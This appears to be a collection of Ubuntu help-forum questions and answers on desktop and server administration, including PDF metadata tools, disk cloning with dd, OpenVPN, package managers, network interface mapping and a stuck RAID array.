on you, I'd throw /var into a separate partition, too. \nOtherwise, I'm with Olli\n", "Q: How to edit pdf metadata from command line? I need a command line tool for editing metadata of pdf-files. \nI'm using a Aiptek MyNote Premium tablet for writing my notes and minutes on this device, import them later and convert them to pdf automatically with a simple script using inkscape and ghostscript.\nIs there any command line tool to add some categories to the pdf's metadata, so i can find the pdf later (e.g. with gnome-do) by categories?\nUpdate: I tried the solution with pdftk and it works, but it seems that gnome-do doesn't take care of pdf-metadata. Is there a way to get gnome-do to do that? \n\nA: To elaborate on the pdftk method, which is nice because it shows you everything that's being set, at the same time as allowing you to change anything you like, here is a script (for your .bashrc or other aliases file) to do it with one command. This creates a new version of the file you want to edit, opens your favourite editor with the metadatafile, and then implements your changes and sets the file creation/modification time on the modified PDF file to be the same as the original. To use it, after resourcing your .bashrc file, just type\neditPDFmetadata myfile.pdf\nHere's the alias:\neditPDFmetadata() {\nOUTPUT=\"${1}-new.pdf\"\nMETADATA=\"tmp${1}-report.txt\"\npdftk \"${1}\" dump_data output \"$METADATA\"\n$EDITOR \"$METADATA\"\npdftk \"${1}\" update_info \"$METADATA\"  output \"$OUTPUT\"\ntouch -r \"${1}\" \"${OUTPUT}\"\n}\n\nSimply place the definition above into the .bashrc file in your home folder, then open a new terminal and it will be ready to use.\n\nA: I needed to blank out the Author field in a PDF exported from LibreOffice.

YMMV) up to the closing >.\n\n\n*Ctrl+X to save and exit.\n\nA: I have extensively tested the functionality of pdftk and exiftool. I have used exiftool both at command line and through a graphical window. These have been tested for small, medium size and very large PDF documents and found to have issues with the largest and most complex PDF documents. In my experience, the pdftk / exiftool have top functionality only for small and for simple-in-formatting PDF documents. For large and complex PDF documents (eg more than 80 pages with multiple fonts) images and/or characters may fall out from the last pages after the metadata has been edited. The solution may be in the use of Ghostview, which I saw just now. No doubt these programs will improve with time.\nIn the meantime, I have found a solution in using the present form of Wine in Ubuntu with a one-window tiny freeware program, which works also for these large, complex PDF documents: BeCyPDFMetaEdit (available eg from freeware libraries like SoftPedia). \n\nA: You can edit PDF metadata using pdftk. Check out the update_info (or update_info_utf8 if you need accented characters) parameter. As for data file, below is an example:\nInfoKey: Title\nInfoValue: Mt-Djing: multitouch DJ table\nInfoKey: Subject\nInfoValue: Dissertation for Master degree\nInfoKey: Keywords\nInfoValue: DJing, NUI, multitouch, user-centered design\nInfoKey: Author\nInfoValue: Pedro Lopes\n\n(Source)\n\nA: Give exiftool a try; it is available from the package libimage-exiftool-perl in the repositories.\nAs an example, If you have a pdf file called drawing.pdf and you want to update its metadata, use the utility, exiftool, in this way:\nexiftool -Title=\"This is the Title\" -Author=\"Happy Man\" -Subject=\"PDF Metadata\" drawing.pdf\n\nFor some reason the Subject entered ends up in the keywords field of the metadata in the pdf file. not a problem in some cases, even desirable, however, this may be problematic: evince and the nautilus metadata previewer do not show this, but Adobe Acrobat viewer and PDF-XChange viewer do.\nThe program will create a backup of the original file if you do not use the -overwrite_original switch. This means a duplicate will exist in the folder where the updated pdf is. From the example above, a file named drawing.pdf_original will be created.\nUse the overwrite switch at your own risk. My suggestion is not to use it and script something to move this file to a better location just in case.\n\nA: Using Ghostview\nInstall ghostscript with:\n$ sudo apt install ghostscript\n\nCreate a file named pdfmarks with similar content:\n[ /Title (Document title)\n  /Author (Author name)\n  /Subject (Subject description)\n  /Keywords (comma, separated, keywords)\n  /ModDate (D:20061204092842)\n  /CreationDate (D:20061204092842)\n  /Creator (application name or creator note)\n  /Producer (PDF producer name or note)\n  /DOCINFO pdfmark\n\nthen combine this pdfmarks file with a PDF, PS or EPS input file:\ngs -dSAFER -dBATCH -dNOPAUSE -sDEVICE=pdfwrite -sOutputFile=output.pdf original.pdf pdfmarks\n\nSource: http://milan.kupcevic.net/ghostscript-ps-pdf/\n\nA: This is in the act library so you can edit PDF metadata from the command-line here as well.\n$ npm install @lancejpollard/act -g\n$ act update input.pdf --title foo --author bar --subject baz -k one -k two\n\nYou can also set -p publisher, -c creator, -t0 created date, and -tn updated date.\n", "Q: Upgrading a dual-boot system HDD I dual-boot my laptop due to lousy VM performance, and have a new 500GB/7200rpm drive coming in to replace the stock 320GB/5400rpm drive.  I have the drive set up in three partitions: one for the Win7 system files, one for storage, and the third as the ext4 Linux file system.  The system file and storage partitions are both NTFS.\nWhat I'm planning to do is use the system image creator built in Win7, then move that over to the new drive.  However, how can I migrate the Ubuntu partition, and how do I make sure that the Grub bootloader isn't overwritten by the Windows loader?\n\nA: Solution 1:\nNot a huge problem. All you need is a computer which has at least two SATA ports to use both HDDs at the same time. If you don't have an second computer handy, you could do it with on if these SATA to USB adapters but that is painfully slow. May you have an eSATA, USB 3.0 or FireWire port you could use to (\\w the appropriate adapter).\nWhen you (re)install your Win7 successfully on the new drive (which is not a good thing in general. Just kidding.) you have to pay attention to the partitioning. The Win7 should only use a part (eg. 180 GB) of your drive and NOT the entire HDD. (If its not possible to set this within the Windows installer you can resize/shrink the partition afterwards via gparted on a live CD/DVD.)\nAfter you have your Win7 in place, use one of these Ubuntu live CDs/DVDs with both your old and your new drive connected to your computer.\nUse gparted to set up a partition on your new drive which has exactly the same size as you old Ubuntu partition.\nWith a simple dd you can then move over the data to your new partition:\ndd if=/dev/sda3 of=/dev/sdb3\n\n(Of course you have to change the partition names according to your setup.)\nAfter you did this you can resize the partition with gparted to fit your needs.\n(Of course you can do this with your data partition as well.)\nSolution 2:\nIts super simple if you just move over the entire disk to the new drive at once. (I don't know if this causes any problems on the Windows side, but it shouldn't.)\nJust connect both drives to your computer and run:\ndd if=/dev/sda of=/dev/sdb\n\n(Check device names!)\nATTENTION: This process can take for ever. But it works. Do NOT interrupt it. (Google to find out how to check the state of dd.)\nAfter the move is done you can use gparted to resize the partitions to your needs.\nMBR:\nIf you use the second solution the MBR should be copied automatically. If you want to save it anyhow you can do this via:\ndd if=/dev/sda of=MBR bs=446 count=1\n\n(This saves the MBR into a file called \"MBR\".)\nIf you then run this you could 're-apply' the MBR to your new drive afterwards.\ndd if=MBR of=/dev/sda bs=446 count=1\n\nI hope this helps you somehow. It really sounds more complicated than it actually is. Hit me up if you need more help or have problems.\n(Device and partition names (like '/dev/sda/') may change according to your setup.)\n", "Q: How to start a job at precise time? I want to start a recording job at a precise time. As I understand cron only guarantees a job to be started within a minute.\nOne possible solution is to start the cron job earlier and than wait until the precise time. What other possibilities do I have?\n\nA: Easiest way is to put cron job to start it minute earlier and then add timing by your own.\nYou can also use at. At least man page of at says that you can use rather exact timing, including seconds. You can test this by adding at job that records time, for example shell script running\ndate > ~/at_test\n\nIf you go with cron route, date +%s is your friend.\nFor example\n#!/bin/bash\ntarget_time=1298301898\nlet wait_time=target_time-`date +%s`\nif [ $wait_time -gt 0 ]; then\n sleep wait_time\nfi\n# Execute your code\n\nWith this approach your next problem is to figure out how to determine target_time. If you always know that you want to start it in the next minute, you can use\nsleep 2 # Avoid running on xx:59, if cron starts immediately.\nlet wait_time=60-`date +%M`\nsleep wait_time\n\nto wait until minute changes.\n", "Q: Hide mounted volume icon on the desktop?

What is the best way to learn how to set up a VPN using OpenVPN on an Amazon EC2 server/a VPS? What level of proficiency is required in Linux System Administration for this?\n\nA: The best way to learn is read the official OpenVPN documentation. Really, there is no better resource, and the official documentation is not at all bad.\nhttp://openvpn.net/index.php/open-source/documentation.html\nHave a look at the example config files here:\nhttp://openvpn.net/index.php/open-source/documentation/howto.html#examples\nIf you remove the (very good) comments, you are left with around 10 lines of self-explained configuration instructions. There is no easier way if you want to do it alone, on your own server.\nAs for the second part of the question.\nIf you are OK with the command line, you have installed one or two other services (like a web server for example), this should be no trouble for you.\nBesides, apt does most of the job for you.\nBonus: \nHere is is a fine guide on how to do it on a linode vps, which is really not at all different than any other ubuntu server installation.\nhttp://library.linode.com/networking/openvpn/ubuntu-10.10-maverick\n\nA: What's the best way to learn how to setup OpenVPN?\nRead the How To on the OpenVPN website for an introduction, and while configuring OpenVPN, you'll learn by trial and error. I recommend you testing your firewall rules/ routing settings on your home network first, in case anything go wrong and you loose your SSH connectivity, you can always walk to the physical machine and fix it.\nThe manual page is very useful for getting known with the configuration directives, and explains how custom scripts are evaluated in which order.\n(the next setup was intended for a secured Internet connection on a Debian machine / Ubuntu client. Ubuntu is based on Debian, so it works for an Ubuntu server as well)\nI've recentely messed a week with OpenVPN to get it to work, the network setup, addresses, route information and configuration file can be found in How do I configure OpenVPN for accessing the internet with one NIC?. I had only one network interface (eth0), and did not want to use bridging.\nI wanted to have IPv6 connectivity through my VPS as well, so I used a tap device (layer 2) instead of a tun device (layer 3). My IPv6 (with scripts) setup can be found at How can I setup OpenVPN with IPv4 and IPv6 using a tap device?.\nUbuntu has a wiki page on setting up OpenVPN for a server+client. I only needed step 1-3 for generating a key, with the custom setup above without using bridges.\nWhat level of proficiency is required in Linux System Administration for this?\nBasic knowledge of networking (what layers are, routing) makes you better understand how OpenVPN works. After having set up OpenVPN, you're done. Like any other application, keep your installation up to date (sudo apt-get update && sudo apt-get upgrade) and make sure your keys for using OpenVPN do not get lost.\n", "Q: apt-get vs. aptitude .vs synaptic compatibility As a former Debian user, I \"kind of\" remember that I should only use one of the package managers...\nEither apt-get, aptitude, or synaptic, but not the three in combination 'cause there may be conflicts, they don't mix well.\nI don't know where I have heard it, but it has left its memory print.\nSo I just want to check with you if it is really not advised or if it is an urban legend and it is completely safe. Could you confirm this ?\nIs the cleanest way of installing a package is still using the command checkinstall before invoking dpkg ?\n\nA: Synaptic and apt-get are compatible. Aptitude is not compatible with synaptic. This is fact, not \"urban legend\" as another poster claimed.\nToday I wanted to find out which Java runtime my system has. Googling turned up the following suggestion: in a command shell, type:\naptitude search \"?provides(java-runtime)\"\nThis generated (among other lines) the following:\n\npi  gcj-4.4-jre\npi  gcj-jre\n\nWhat the \"pi\" means is that it's not currently installed, but is marked for installation.\nSo if I went into aptitude and just asked it to install requested packages, it would install gcj-4.4-jre.\nHowever, in Synaptic, it is neither installed nor marked for installation. If I ask Synaptic to install requested packages, it does nothing.\nI'm no expert on this stuff, and I have no idea where aptitude is stashing its notions of package states, but it's obvious that it's not compatible with Synaptic.\n\nA: All of those use dpkg as a backend. Neither one uses any specialized database that breaks when you use something else.\nIt's definitely urban legend.\nIf you want to install something from source code, cleanest way is to use checkinstall, or install it to /usr/local. Using package manager is better, because then removing that package is much easier.\n\nA: The only real difference is Aptitude.\n\n\n*\n\n*If you use it interactively install something, then remove that package in something else and then go back to Aptitude, it will think you want to reinstall it. You just have to clear selections when it loads (easy enough through the menu).\n\n*It will also run an autoremove so old dependencies are cleaned up. This can be dangerous if you accidentally remove something that is a dependant of a metapackage and you remove it and all its deps.

Critical security bug fixes are included in \"Important securty updates\" in the update manager.\nIf you want your system to be secure you must install security updates as soon as possible. Without these updates, attackers may use vulnerabilities in your software to attack your system.\nAlso, it's a good idea to make Ubuntu check for updates daily and install security updates without confirmation:\n\nImage source: Setup Ubuntu 10.10 Maverick Meerkat to Install Security Updates Automatically\n\nA: What is a security update? How are they different from other updates?\nUsually they are security-related bugs rather than new features or bug fixes. For example, it might fix a buffer overflow a developer found.\nIf I don't install them, is my system insecure? \nNot necessarily, but there are exploits. If someone could manage to exploit them (which might not even be possible unless they have another exploit), it isn't totally compromised. However, you should assume that it is insecure, because if theres a slight chance that it is, for all purposes it is.\nHow can there be very frequent security updates? Does it mean my ubuntu is very unstable or insecure?\nThis comes into the differences between Linux and closed-source operating systems.\nIn Linux, security flaws are found much easier when they exist due to the code being open. Then the patch is immediately put upstream and onto your computer through the package update.\nWhereas in a closed source system, often such flaws aren't found until exploitation. Its just a matter of when the security flaw is found, not the existence itself.\n", "Q: Security in Hybrid cloud How do we ensure security while setting up a hybrid cloud?\nFor example, if I want to use EC2 or Rackspace, how can I make sure that the connectivity between the private and the public cloud is secure? \nIs a VPN necessary? If so, do we have to set it up manually?\n\nA: Will Amazon or Rackspace be hosting both your private and public cloud? If so, this would be a question for them. If you are personally managing a part of the cloud then you need to ensure that whatever distributed system architecture you're using to distribute workload uses secure means to transfer jobs/data/tasks. I doubt any modern distrib system architecture would send data over insecure channels, though.\nIn the off chance that the architecture does not support secure distribution of data, a VPN would be an easy and simple solution, though.\n", "Q: Laptop won't \"hibernate\" then \"thaw\" Can anyone help me with a suspend-resume problem?\nI have two identical ThinkPad laptops (7764CTO).

How do I edit files so that Banshee correctly identifies all the songs as belonging to the same album?\nI am using the latest Banshee via the unstable PPA.\n\nA: You need to select the songs you want to change using Shift-click and go to the following dialog box (from right clicking on your selection and choosing \"Edit Track Information\"):\n\nThen make sure the \"Compilation Album Artist\" is checked, and put what you want in the input box.

I'm thinking of using /etc/network/interfaces. So, I added some code and it looks like this:\nauto lo\niface lo inet loopback\n\nauto eth1\niface eth1 inet static\naddress #corresponding value\nnetmask #corresponding value\ngateway #corresponding value\nhwaddress #corresponding value\n\nAfter restarting networking I get the following message:\n*Reconfiguring network interfaces...\n#here some help code appears\nFailed to bring up eth1.\n\nThe default interface that works with NM is eth0. Please advise on how to handle the problem.\n\nA: eth0 or eth1 is the logical name given to your network card by Linux (I dont know exactly which component handles the naming but i guess its the kernel). you can only use eth0 or eth1 if its the logical name given to your card and not otherwise.\nComing to your original problem i.e using different hardware address at different locations, this is doable by defining logical name mapping in /etc/network/interfaces file but you will have to connect manually to network using ifup command eachtime. \nTo do this open your /etc/network/interfaces file and replace its contents with following\nauto lo\niface lo inet loopback\n\nmapping eth0\n      script /home/<username>/net.sh\n      map eth0 eth0-home\n      map eth0 eth0-work\n\niface eth0-home inet static\n      address #ip address for home\n      netmask #subnet mask for home\n      hwaddress ether #MAC address for home\n\niface eth0-work inet static\n      address #ipaddress for work\n      netmask #netmask for work\n      hwaddress ether #MAC address for work\n\nset the ip address, netmask and hwaddress for eth0-home and eth0-work to your liking. Also replace the <username> in fourth line of the script with your user name. Now save and close the interfaces file.\nNow create a file /home/<username>/net.sh with the following contents\n#!/bin/sh\necho eth0\n\nsave and close the net.sh file.\nYou are all set now. You can use command sudo ifup eth0=eth0-home to start network with eth0-home settings and sudo ifup eth0=eth0-work to start with eth0-work settings.\nAlso please note that the mapping section in interfaces file and the script file that we created in your users home directory are actually needed when the interface is configured to connect automatically. But we need to provide them for things to work. So the contents of the script file and the contents of mapping section are just sort of place holders. If you are interested in connecting automatically you will need to modify these two. For further discussion of the two you can see man page for interfaces(5) or visit the following link http://addisu.taddese.com/blog/mapping-in-linux-network-interfaces/\n\nA: You must decide if you want to use NM or the \"hardcoded\" config in the interfaces file. As far as I experienced it's not a good idea to mix them, you will have problems. You may want to drop using NM, ok. However names like eth0 and eth1 are assigned to ethernet NICs, so if you use eth1, I would think you have two NICs in your machine. Yes, it's possible that you have only eth1 and not eth0 (you can even rename NICs) but I don't see the point here. Please issue command /sbin/ifconfig -a in terminal and use the eth name what you can see there. If you see only eth1 and not eth0 it's ok to use too, that's possible: udev rules names interfaces according the HW address (\"MAC address\") to be sure, that your interfaces won't be renumbered if you change the PCI card positions and similar things. I had the experience, that replacing a card with another one caused I have only eth1 (and no eth0 at all) since udev remembers about the old card's HW address so name eth0 is reserved for that purpose, thus I had eth1 as the new NIC. I am not sure you mean about this when you want to use eth1 but it's nice to mention (btw udev stores assignment(s) here: /etc/udev/rules.d/70-persistent-net.rules).\n", "Q: How can I change or shut off a screensaver setting without using Gnome I set a screensaver that freezes my computer and because changing the screensaver using the Gnome desktop displays the screensaver it locks up my computer before I can make the change.  \nI would prefer to set the screensaver off.\n\nA: Using the graphical tool GConf Editor:\n\n\n*\n\n*Run the command gconf-editor from a terminal or  the Alt+F2 dialog.  \n\n*Navigate to apps ➜ gnome-screensaver.\n\n*Uncheck the idle_activation_enabled setting to stop the screensaver from activating automatically.\n\n*If you want to set the screensaver theme to Blank screen, right click on the themes item and click Unset Key.  \n\n\nFrom the command line:\n\n\n*\n\n*Disable the screensaver from automatically running when the computer is idle:\ngconftool --set --type=bool /apps/gnome-screensaver/idle_activation_enabled False\n\n\n*Set the screensaver theme to Blank screen:   \ngconftool --unset /apps/gnome-screensaver/themes\n\n", "Q: ACPI shutdown not working from VirtualBox I have several Ubuntu 10.10 (Maverick Meerkat) servers running in VirtualBox 4.0.4 (however this issue was also present in VirtualBox 3.2.8).

Please make sure\n  you have set the $BROWSER environment variable to\n  the filename of the web browser we should launch!\n\nWhat is the best way to set this environment variable globally for all users?\n\nA: From the Ubuntu Community Documentation on environment variables:\n\nSystem-wide environment variables \nEnvironment variable settings that affect the system as a whole (rather then just a particular user) should not be placed in any of the many system-level scripts that get executed when the system or the desktop session are loaded, but into  \n  \n  \n*\n  \n*/etc/environment - This file is specifically meant for system-wide environment variable settings. It is not a script file, but rather consists of assignment expressions, one per line. Specifically, this file stores the system-wide locale and path settings.  \n  \n  \n  Not recommended:\n  \n  \n*\n  \n*/etc/profile - This file gets executed whenever a bash login shell is entered (e.g. when logging in from the console or over ssh), as well as by the DisplayManager when the desktop session loads. This is probably the file you will get referred to when asking veteran UNIX system administrators about environment variables. In Ubuntu, however, this file does little more then invoke the /etc/bash.bashrc file.  \n  \n*/etc/bash.bashrc - This is the system-wide version of the ~/.bashrc file. Ubuntu is configured by default to execute this file whenever a user enters a shell or the desktop environment.\n  \n\nThe two files under Not recommended will work, but /etc/environment is there just for this purpose so we'll edit that file:\ngksu gedit /etc/environment\n\nAnd add the following line:\nBROWSER=/usr/bin/firefox\n\n\nYou can replace /usr/bin/firefox with the path to whatever browser you prefer.\nNOTE: You will have to restart your computer for the changes to take effect.\n\nA: If your modern Ubuntu version reads ~/.profile, this might be a far more practical place to define the $BROWSER variable on a per-user basis.\nSimply add:\nexport BROWSER=/usr/bin/palemoon\n\n", "Q: Block access to specific applications I would like to give several users  rights to a computer running Ubuntu to do most administrative functions such as add/remove programs, save files, make settings changes, etc.  However, I would like to block them from using several specific applications.  Is this possible, and how would I do so?\nTo provide a bit more detail:  I am trying to set up Gnome Nanny to block adult websites from my kids' computer.  I'd like to give them full access to the computer ACCEPT for Gnome Nanny.  Windows has a program called K9 that cannot be turned off or uninstalled unless the user has the password EVEN if the user is an admin.\nSounds like this isn't available on Ubuntu without a rather involved process of setting permissions on a large list of applications and functions to mimic admin rights.\n\nA: As long as you can make settings changes, you are omnipotent. To add remove program, you can grant sudo rights for aptitude and apt-get (not synaptic as it permits to add repositories). But this is not real security.\nIf you know specific resources that they need access, it is different.\nBy the way, as long as they can reboot and change the kernel command in grub, they are omnipotent. As long as they can reboot in another medium (USB key, Live-CD, PXE,...), same thing. If they can open the hardware and extract the hard disk... ditto. Securing a computer is not easy at all. If you just need to put enough fences around some adventurous users, you can't.\nEDIT reply:\nIf your kids are computer geeks, there is no way with technical tricks to be sure they do only want you allow them to do, even those advertised as not-uninstallable (install a virtual machine and tor). If you look at dictatorship or at actual revolutions in North Africa, the only way the countries have found to block unwanted behavior was to shutdown Internet connexions and it seams to be insufficient. In the same way, the only thing you can do it shutdown Internet or the computer. And even like that, they can see it at friends.\nWhat follows is not really an Ubuntu answer, but I care about children and I hope this can help. My best solution is education:\n\n\n*\n\n*Warn them about what they can and can't do, where are your limits.\n\n*Acknowledge to them you can't and don't want to survey everything they do. You can log everything they do, but really, it is putting a spycam in their lives.\n\n*Explain them what is a sexual predator and how they act. (soon)\n\n*Show them what is an indelible trace on the internet and on social networks. Visual chats are recordable and most new computer have a webcam.\n\n*Put a good advertisement blocking plugin.\n\n*Oh, I didn't say it to you before, but they will go to pornographic web sites (as soon as 10-12 year old for some of them). Here your best friend (in my point of view) is sexual education before they have seen one/too much and explain that they don't have to do everything that is done there.\n\n*If you educate them to late, it will be less useful. The good time is up to you, in function of your and their situation.\n\n\nTechnology is not a solution for human interaction and I hope it will never be.\n\nA: If I understand Gnome Nanny correctly, it only supports certain programs for the various things it checks and/or blocks.\nIf you allow them to install software, you're not in the clear by just stopping access to the Nanny.\nThat, and what @shellholic says about rebooting makes met think you might need to find another method. The preferred from my point of view would be the social one, making sure the kids don't view stuff they shouldn't because they shouldn't. but otherwise, you might want to filter your internet outside of the computer. (ofcourse, all sorts of proxy, ssl undsoweiter. tricks can circumvent that again....)\n\nA: Since you have a specific program that you would like to curtail, change the read/write/execute permissions for that program (and maybe its files) for user-only (go-rwx).  You can get the list of its files from Syntapic or Apt.  Make sure that your children have their own account(s) and are not able to execute that program (including sudo privs).  Your own account should have sudo privs to be able to call the program.\n", "Q: Why can't I boot from portable HD? I've been trying to get Ubuntu 10.04-LTS  32-bit desktop installed onto a 250GB FreeAgent Go drive from Seagate. \nI've been able to install onto a USB flash drive and boot successfully from this. I have installed Ubuntu onto the jump drive using Universal USB Installer, and this was a total success in terms of getting Ubuntu to run off a flash drive. I was unable to accomplish this with the portable HDD.\nI then, following instructions, attempted to install the OS onto the HDD once booted up from the flash drive. After installing the OS on the HDD, the computer would simply not load the OS when the HDD medium was selected for booting from.\nHowever, as there is no System-> Preferences-> Removable Drives and Media I could not complete this step. Is this vital? How do I do this under Ubuntu 10.04?\nI have formmated the MBR on the HDD and repeated the above, still with no success.\nI have also browsed some forums that mention there may be something related to spin-up speeds, but nothing explained in detail the issue or how to solve it, and I'm not familiar enough with system booting to understand if this could be an issue.\nBasically, what I'm trying to do is get Ubuntu to boot off the HDD, I've attempted several things, and the result is, after selecting the HDD from BIOS, the OS never starts booting (after waiting upwards of ten minutes). I just have a white cursor blinking. I can always get it to boot from the jump drive.\nRelated question\n\nA: The instructions you used are ancient, your incomplete step is likely irrelevant now. I don't see anything else wrong with the process. I'm thinking grub wasn't properly installed. What you'll need to do is boot into a live environment and install grub. This guide has the relevant info:\nhttps://help.ubuntu.com/community/RecoveringUbuntuAfterInstallingWindows\nFor reference, the command you need to run is:\nsudo grub-install --root-directory=/media/0d104aff-ec8c-44c8-b811-92b993823444 /dev/sda\n\nYou just need to replace the long 0d104* string and sda with the UUID and /dev name (respectively) for your system. You can find the info by matching the name in /media with the output of df.\n\nA: You can do a full install on a portable HD, like you would do a regular install on your regular HD, except you would select your portable HD instead. The downside to doing it this way is that you can't take it to another computer plug it in, and then use it, unless the hardware is EXACTLY the same.\n", "Q: Emerald window decorator fails to start... sometimes I'm running Ubuntu 10.04 and I have some weird issues with emerald not starting sometimes, leaving me \"chromeless\" windows. I can, of course then start emerald with emerald --replace > /dev/null 2>&1 & \\ disown $!, but it'd be really nice to just make sure it starts no matter what. \nCurrently, emerald is being started by compiz, I believe, as I set emerald as my decorator using CompizConfig Settings Manager:  \n\nIs there a better way to do this so that we can ensure that it starts every time?\n\nA: I think the preferred way to make Compiz use Emerald for the window decorations is to create the file ~/.config/compiz/compiz-manager and add the following line:  \nUSE_EMERALD=yes\n\nThe script /usr/bin/compiz-decorator looks for the config file \n$XDG_CONFIG_HOME/compiz/compiz-manager\n\n($XDG_CONFIG_HOME is ~/.config by default) for user specific preferences.    \nSo set the command for the Window Decorations module back to /usr/bin/compiz-decorator and create/edit the config file as described above.\n\nA: A while back I had issues with Compiz either not starting, or crashing out, leaving everything unmanaged. At first I created a launcher on the desktop (pointing to compiz --replace) but I soon got tired of that.\nThe long term \"solution\", while still a hack, was to create a little inline script to run on boot in the Startup Applications (in System -> Preferences) that ran:\nbash -c \"sleep 2; compiz --replace\"\n\nSo I suggest you do something similar with emerald. I don't think you need all that redirection fluff you have on the end. You could probably get more intelligent about it (looking for an existing emerald process before loading it), but if you don't mind a bit of window flicker on boot, there's no harm in replacing a running instance with a new one.\n\nA: You can use Compiz Fusion Icon which can be easily installed by dropping sudo apt-get install fusion-icon in a terminal. After that, find the fusion-icon in the System Tools menu and you will have several choices in the panel's fusion icon, which includes but not limits to: Select Window Decorator.\nRight click the fusion icon and choose your prefered window decorator, window manager and a few other features. Then select \"Reload Window Manager\" and your monitor or windows may flicker. \nDon't worry, it will take just a moment to reload your options and after that you can close the fusion Icon. The options should persist this time.\nA screenshot is placed here to illustrate.\nGood luck!\n\n", "Q: Can't run thunar-volman Whenever I try to run thunar-volman (from a terminal), I get there following error:\nthunar-volman: Must specify the new HAL device UDI with --device-added.\nHow can I get thunar-volman to work? Or is there another way to view mounted drives in thunar?\n\nA: Doesn't thunar automount drives? Basically \"mount\" command lists the mounted drives. Here is some information regarding removable media and thunar. You can look into troubleshooting section for using thunar-volman. \n", "Q: Get Creative soundcard working correctly I am trying to get sound going on my fresh install of 10.10. \nI have a creative fatlity branded sound card.

Sometimes you just can see the color change steps in gradients for instance. Something similar affects anti-aliasing.\nIs this a bad installation problem, a Gimp limitation, a system configuration issue, or...?\n\nA: I was new to Ubuntu 2 years ago, and also to Gimp. I still have much to learn about Ubuntu and Gimp. I do a lot of picture editing, resizing, compressing for websites, color adjusting, etc., and I have fallen in love with Gimp. What helped me a great deal was the Gimp Lite tutorial on their site.\nNow to your problem. This is just a guess, but I think it may be a lack of sufficient memory, or video memory on your system. Those are the only times I've seen what you are describing show up. I've never had any issues with Gimp not working at all. Maybe some folks can give you an analytical way to know if this is the issue.\nIf you know the following information, please post it for me to review:\n1. Processor - Make, Model, Cores\n2. RAM on your computer\n3. Video Ram on your video\n4. What size pictures are you working with? If they are very large from newer high mega pixel cameras, have you tried to resize them to see if you still have the issues when you work on them?\n5. Are you using Gimp with a lot of other programs open?\n\nA: This is because GIMP can handle only 8bit per color channel. That makes 254 gradations between pure white and pure black. That is, if you draw a gradient from white to black further than 256 pixels you will already get staircase. Same if you draw a gradient from mid-grey to black or white further than 128 px.\n", "Q: What can I use to chat on Battle.net?

You can choose a nickname/username and enter. If it is already taken you will be allocated a guest id otherwise you can register the same nickname.\n\nA: You need to have telepathy-idle installed, and you need to have at least one non-IRC account (see Gnome bug #596086 for more details). Then you can connect to the IRC server by creating an account, and join a channel by using the Room > Join room dialog. \nSource\n", "Q: Raid md device is not remove from memory, how to overcome this problem I create raid 10 , i removed two arrays form md11 one by one , after that i going to editing the contents those are mounted ( it will be not responding stage), after i try for remove arrays those are left it is shows device or resource busy ( is not removed from memory). i try to terminate process this is also not work, i absorve from 4 days resync will be 8.0% it can not modifying.\n#cat /proc/mdstat\n\nPersonalities : [raid1] [raid0] [raid6] [raid5] [raid4] [linear] [raid10] md11 : active raid10 sde1[3] sdj14 286743936 blocks 64K chunks 2 near-copies [4/1] [___U] [1:2:3:0] [=>...................] resync = 8.0% (23210368/286743936) finish=289392.6min speed=15K/sec\n\n#mdadm -D /dev/md11\n/dev/md11: Version : 00.90.03 Creation Time : Sun Jan 16 16:20:01 2011 Raid Level : raid10 Array Size : 286743936 (273.46 GiB 293.63 GB) Device Size : 143371968 (136.73 GiB 146.81 GB) Raid Devices : 4 Total Devices : 2 Preferred Minor : 11 Persistence : Superblock is persistent\n\nUpdate Time : Sun Jan 16 16:56:07 2011\n      State : active, degraded, resyncing\n\nActive Devices : 1 Working Devices : 1 Failed Devices : 1 Spare Devices : 0\n\n     Layout : near=2, far=1\n Chunk Size : 64K\n\nRebuild Status : 8% complete\n\n       UUID : 5e124ea4:79a01181:dc4110d3:a48576ea\n     Events : 0.23\n\nNumber   Major   Minor   RaidDevice State\n   0       0        0        0      removed\n   1       0        0        1      removed\n   4       8      145        2      faulty spare rebuilding   /dev/sdj1\n   3       8       65        3      active sync   /dev/sde1\n\n#umount /dev/md11\numount: /dev/md11: not mounted\n\n\n#mdadm -S /dev/md11\nmdadm: fail to stop array /dev/md11: Device or resource busy\n\n\n#lsof /dev/md11\n\nCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAME mount 2128 root 3r BLK 9,11 4058 /dev/md11 mount 5018 root 3r BLK 9,11 4058 /dev/md11 mdadm 27605 root 3r BLK 9,11 4058 /dev/md11 mount 30562 root 3r BLK 9,11 4058 /dev/md11 badblocks 30591 root 3r BLK 9,11 4058 /dev/md11\n#kill -9 2128\n#kill -9 5018\n#kill -9 27605\n#kill -9 30562\n#kill -3 30591\n\n#mdadm -S /dev/md11\nmdadm: fail to stop array /dev/md11: Device or resource busy\n\n\n#lsof /dev/md11\n\nCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAME mount 2128 root 3r BLK 9,11 4058 /dev/md11 mount 5018 root 3r BLK 9,11 4058 /dev/md11 mdadm 27605 root 3r BLK 9,11 4058 /dev/md11 mount 30562 root 3r BLK 9,11 4058 /dev/md11 badblocks 30591 root 3r BLK 9,11 4058 /dev/md11\n\n\n#cat /proc/mdstat\n\nPersonalities : [raid1] [raid0] [raid6] [raid5] [raid4] [linear] [raid10] md11 : active raid10 sde1[3] sdj14 286743936 blocks 64K chunks 2 near-copies [4/1] [___U] [1:2:3:0] [=>...................] resync = 8.0% (23210368/286743936) finish=289392.6min speed=15K/sec\n\n\nA: So it looks like you started off with 5 disks, I don't see a number \"two\" disk\nin this list and you need 4 disks just to create a RAID 10\nNumber   Major   Minor   RaidDevice State\n\n   0       0        0        0      removed\n\n   1       0        0        1      removed\n\n   4       8      145        2      faulty spare rebuilding   /dev/sdj1\n\n   3       8       65        3      active sync   /dev/sde1\n\nand a spare was defined which automatically kicked in.

